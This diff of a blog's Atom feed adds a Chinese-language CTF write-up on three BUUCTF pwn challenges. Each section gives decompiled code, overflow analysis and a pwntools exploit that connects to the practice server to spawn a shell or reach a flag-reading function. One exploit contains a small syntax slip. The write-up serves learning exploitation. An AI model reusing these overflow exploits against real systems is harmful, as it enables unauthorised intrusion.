@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://cc-nianchu.github.io</id>
     <title>nianchu</title>
-    <updated>2021-07-23T12:36:37.743Z</updated>
+    <updated>2021-07-31T13:00:46.144Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://cc-nianchu.github.io"/>
     <link rel="self" href="https://cc-nianchu.github.io/atom.xml"/>
@@ -10,6 +10,280 @@
     <logo>https://cc-nianchu.github.io/images/avatar.png</logo>
     <icon>https://cc-nianchu.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, nianchu</rights>
+    <entry>
+        <title type="html"><![CDATA[每日3+道题，之前被迫出门7天正式回归]]></title>
+        <id>https://cc-nianchu.github.io/post/mei-ri-3dao-ti-zhi-qian-bei-po-chu-men-7-tian-zheng-shi-hui-gui/</id>
+        <link href="https://cc-nianchu.github.io/post/mei-ri-3dao-ti-zhi-qian-bei-po-chu-men-7-tian-zheng-shi-hui-gui/">
+        </link>
+        <updated>2021-07-31T12:58:28.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="the-first-titleciscn_2019_n_8">the first title:ciscn_2019_n_8</h2>
+<p>好久没做题了 先刷刷buu<br>
+上来给了附近  拿到附近先checksec</p>
+<pre><code>    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre>
+<p>发现这是 32位程序 并且开了各种各样的保护<br>
+打开ida32拉入文件 F5一键伪代码</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [esp-14h] [ebp-20h]
+  int v5; // [esp-10h] [ebp-1Ch]
+
+  var[13] = 0;
+  var[14] = 0;
+  init();
+  puts(&quot;What's your name?&quot;);
+  __isoc99_scanf(&quot;%s&quot;, var, v4, v5);
+  if ( *(_QWORD *)&amp;var[13] )
+  {
+    if ( *(_QWORD *)&amp;var[13] == 17LL )
+      system(&quot;/bin/sh&quot;);
+    else
+      printf(
+        &quot;something wrong! val is %d&quot;,
+        var[0],
+        var[1],
+        var[2],
+        var[3],
+        var[4],
+        var[5],
+        var[6],
+        var[7],
+        var[8],
+        var[9],
+        var[10],
+        var[11],
+        var[12],
+        var[13],
+        var[14]);
+  }
+  else
+  {
+    printf(&quot;%s, Welcome!\n&quot;, var);
+    puts(&quot;Try do something~&quot;);
+  }
+  return 0;
+}
+</code></pre>
+<p>很明显  发现这条语句</p>
+<pre><code>if ( *(_QWORD *)&amp;var[13] == 17LL )
+      system(&quot;/bin/sh&quot;);
+</code></pre>
+<p>意思就是只需要(_QWORD *)&amp;v[13] ==17<br>
+并且是QWORD 这是8字节的意思 这题就是图一乐，解题<br>
+EXP如下:</p>
+<pre><code>from pwn import*
+
+#q=process('./ciscn_2019_n_8')
+q = remote(&quot;node4.buuoj.cn&quot;,28263)
+
+payload =='sbsb'*13+p32(0x11)+p32(0)
+q.sendline(payload)
+q.interactive()
+</code></pre>
+<p>这里奉上flag{b3b5aa9f-c456-487a-9907-b25cf6cd0fef}</p>
+<h2 id="the-second-titlejarvisoj_tell_me_something">the second title:jarvisoj_tell_me_something</h2>
+<p>给了附件<br>
+直接用unbuntu ctrl+alt+T打开终端 checksec一下</p>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<p>发现只开了NX保护<br>
+打开ida64 F5获得伪代码</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __int64 v4; // [rsp+0h] [rbp-88h] BYREF
+
+  write(1, &quot;Input your message:\n&quot;, 0x14uLL);
+  read(0, &amp;v4, 0x100uLL);
+  return write(1, &quot;I have received your message, Thank you!\n&quot;, 0x29uLL);
+}
+</code></pre>
+<p>很简洁的一道题，我们发现有write和read函数，可以看出read函数有栈溢出<br>
+并且发现了一个good_name函数</p>
+<pre><code>int good_game()
+{
+  FILE *v0; // rbx
+  int result; // eax
+  char buf[9]; // [rsp+Fh] [rbp-9h] BYREF
+
+  v0 = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
+  while ( 1 )
+  {
+    result = fgetc(v0);
+    buf[0] = result;
+    if ( (_BYTE)result == 0xFF )
+      break;
+    write(1, buf, 1uLL);
+  }
+  return result;
+}
+</code></pre>
+<p>就是经典的栈溢出然后返回到后门函数的题目<br>
+然后点开v4发现有0x88的位置<br>
+EXP如下:</p>
+<pre><code>from pwn import*
+
+#q=process(./guestbook)
+q=remote(&quot;node4.buuoj.cn&quot;,28416)
+
+door_addr=0x400620
+payload='a'*0x88+p64(door_addr)
+q.sendline(payload)
+
+q.interactive()
+</code></pre>
+<p>flag如下：flag{0931ff4c-afd4-4cb2-a673-1d55027682ce}</p>
+<h2 id="the-third-titleciscn_2019_ne_5">the third title:ciscn_2019_ne_5</h2>
+<p>buu上的题目  拿到附件先checksec</p>
+<pre><code>    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+
+</code></pre>
+<p>发现这是32位程序  打开ida32</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int result; // eax
+  int v4; // [esp+0h] [ebp-100h] BYREF
+  char src[4]; // [esp+4h] [ebp-FCh] BYREF
+  char v6[124]; // [esp+8h] [ebp-F8h] BYREF
+  char s1[4]; // [esp+84h] [ebp-7Ch] BYREF
+  char v8[96]; // [esp+88h] [ebp-78h] BYREF
+  int *v9; // [esp+F4h] [ebp-Ch]
+
+  v9 = &amp;argc;
+  setbuf(stdin, 0);
+  setbuf(stdout, 0);
+  setbuf(stderr, 0);
+  fflush(stdout);
+  *(_DWORD *)s1 = 48;
+  memset(v8, 0, sizeof(v8));
+  *(_DWORD *)src = 48;
+  memset(v6, 0, sizeof(v6));
+  puts(&quot;Welcome to use LFS.&quot;);
+  printf(&quot;Please input admin password:&quot;);
+  __isoc99_scanf(&quot;%100s&quot;, s1);
+  if ( strcmp(s1, &quot;administrator&quot;) )
+  {
+    puts(&quot;Password Error!&quot;);
+    exit(0);
+  }
+  puts(&quot;Welcome!&quot;);
+  puts(&quot;Input your operation:&quot;);
+  puts(&quot;1.Add a log.&quot;);
+  puts(&quot;2.Display all logs.&quot;);
+  puts(&quot;3.Print all logs.&quot;);
+  printf(&quot;0.Exit\n:&quot;);
+  __isoc99_scanf(&quot;%d&quot;, &amp;v4);
+  switch ( v4 )
+  {
+    case 0:
+      exit(0);
+      return result;
+    case 1:
+      AddLog(src);
+      result = sub_804892B(argc, argv, envp);
+      break;
+    case 2:
+      Display(src);
+      result = sub_804892B(argc, argv, envp);
+      break;
+    case 3:
+      Print();
+      result = sub_804892B(argc, argv, envp);
+      break;
+    case 4:
+      GetFlag(src);
+      result = sub_804892B(argc, argv, envp);
+      break;
+    default:
+      result = sub_804892B(argc, argv, envp);
+      break;
+  }
+  return result;
+;
+</code></pre>
+<p>发现这里代码很长，我们主要关注重点和大概浏览一下这个程序是干嘛的</p>
+<pre><code> *(_DWORD *)s1 = 48;
+__isoc99_scanf(&quot;%100s&quot;, s1);
+  if ( strcmp(s1, &quot;administrator&quot;) )
+  {
+    puts(&quot;Password Error!&quot;);
+    exit(0);
+  }
+  and
+  case 4:
+      GetFlag(src);
+      result = sub_804892B(argc, argv, envp);
+      break;
+</code></pre>
+<p>看到这几个代码，我们可以发现s1只有48，但是scanf写入100了这边存在溢出漏洞，而且密码已经给出来了administrator。。。然后我们发现本身就有getflag这样的函数，我们点进去查看</p>
+<pre><code>int __cdecl GetFlag(char *src)
+{
+  char dest[4]; // [esp+0h] [ebp-48h] BYREF
+  char v3[60]; // [esp+4h] [ebp-44h] BYREF
+
+  *(_DWORD *)dest = 48;
+  memset(v3, 0, sizeof(v3));
+  strcpy(dest, src);
+  return printf(&quot;The flag is your log:%s\n&quot;, dest);
+}
+</code></pre>
+<p>我们发现他给的flag就是 src直接复制给dest然后输出给我们，src这里我们怎么获得?<br>
+获得就是要先输入1  添加一个log再选4调用getflag<br>
+我们来查看addlog这个函数</p>
+<pre><code>int __cdecl AddLog(int a1)
+{
+  printf(&quot;Please input new log info:&quot;);
+  return __isoc99_scanf(&quot;%128s&quot;, a1);
+}
+</code></pre>
+<p>然后我们发现这里又可以进行溢出，a1是main函数的src给的是48，这里是读入128长度的字符串，可以造成溢出然后将返回地址覆盖为/bin/sh然后将flag丢进去我们再用4调出来<br>
+返回ida按下shift+F12可以查看有system函数<br>
+system_addr=0x080484D0<br>
+或者网上的方法:system_addr=elf.sym['system']<br>
+然后我们就想办法得到/bin/sh  做题的时候找好久都没找出来...<br>
+直至百度....<br>
+ROPgadget --binary ciscn_2019_ne_5 --string '/bin/sh'<br>
+ROPgadget --binary ciscn_2019_ne_5 --string 'sh'<br>
+显示地址0x080482ea:sh<br>
+这里可以得到第一个payload='0x48+4'+p32(system_addr)+'sbsb'+p32(sh_addr)<br>
+EXP如下:</p>
+<pre><code>from pwn import*
+
+#q=process(./ciscn_2019_ne_5)
+q=remote(&quot;node4.buuoj.cn&quot;,27088)
+
+#q.recvuntil('Please input admin password:')
+q.sendline('administrator')
+
+
+#q.recvuntil('0.Exit\n:')
+q.sendline('1')
+
+system_addr=0x080484D0
+sh_addr=0x080482ea
+
+payload='a'*(0x48+4)+p32(system_addr)+'bbbb'+p32(sh_addr)
+q.sendline(payload)
+#q.recvuntil('0.Exit\n:')
+q.sendline('4')
+
+#q.sendline('cat flag')
+q.interactive()
+</code></pre>
+<p>flag:flag{ab30483c-2f22-412a-bc6a-9430b24c8041}</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[One-gadget]]></title>
         <id>https://cc-nianchu.github.io/post/one-gadget/</id>
